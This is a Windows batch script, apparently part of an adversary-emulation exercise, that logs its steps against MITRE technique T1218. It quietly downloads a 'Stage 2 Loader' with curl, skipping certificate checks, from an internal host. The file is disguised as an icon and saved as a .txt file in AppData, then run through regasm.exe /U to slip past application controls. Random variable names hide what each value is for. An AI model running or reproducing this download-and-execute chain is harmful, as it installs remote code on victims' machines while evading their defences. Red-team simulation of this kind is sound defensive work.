@echo off
setlocal enabledelayedexpansion

REM Random-named SET variables for every PHR placeholder
SET pLmqTz=%APPDATA%\10389\8213c508
SET sRwXoK=acb29fbc.txt
SET vNcBhG=https://10.0.0.49/stage/2/icon.png?10389-7
SET jFdEwQ=ITZEL-S2B
SET aLkMnI=10389
SET zXcVbN=7
SET qWeRtY=%APPDATA%\7\macula-simulations.log

REM Initialize log file path
SET logvar=!qWeRtY!

REM Cache single timestamp for all debug lines
SET tsvar=!DATE!/!TIME!

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!jFdEwQ!][!aLkMnI!]: heartbeat_start>> "!logvar!" 2>nul

REM Heartbeat fetch (downloads Stage 2 Loader)
curl -k -s -o "!pLmqTz!\!sRwXoK!" "!vNcBhG!"

REM Debug: heartbeat_complete
echo [!tsvar!][DEBUG][!jFdEwQ!][!aLkMnI!]: heartbeat_complete>> "!logvar!" 2>nul

REM Debug: chdir_start
echo [!tsvar!][DEBUG][!jFdEwQ!][!aLkMnI!]: chdir_start>> "!logvar!" 2>nul

REM Change directory to output location
cd /d "!pLmqTz!" >nul 2>&1

REM Debug: chdir_result=0 (suppress actual path)
echo [!tsvar!][DEBUG][!jFdEwQ!][!aLkMnI!]: chdir_result=0>> "!logvar!" 2>nul

REM Debug: regasm_start
echo [!tsvar!][DEBUG][!jFdEwQ!][!aLkMnI!]: regasm_start>> "!logvar!" 2>nul

REM Execute downloaded Stage 2 Loader via regasm.exe /U
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U !sRwXoK! >NUL 2>&1

REM Debug: regasm_complete
echo [!tsvar!][DEBUG][!jFdEwQ!][!aLkMnI!]: regasm_complete>> "!logvar!" 2>nul

REM Conditional TTP log line after LOLBIN invocation
if %ERRORLEVEL% EQU 0 (
    echo [%date% %time%][TTP][!jFdEwQ!][!aLkMnI!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!logvar!" 2>nul
) else (
    echo [%date% %time%][TTP][!jFdEwQ!][!aLkMnI!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!logvar!" 2>nul
)

endlocal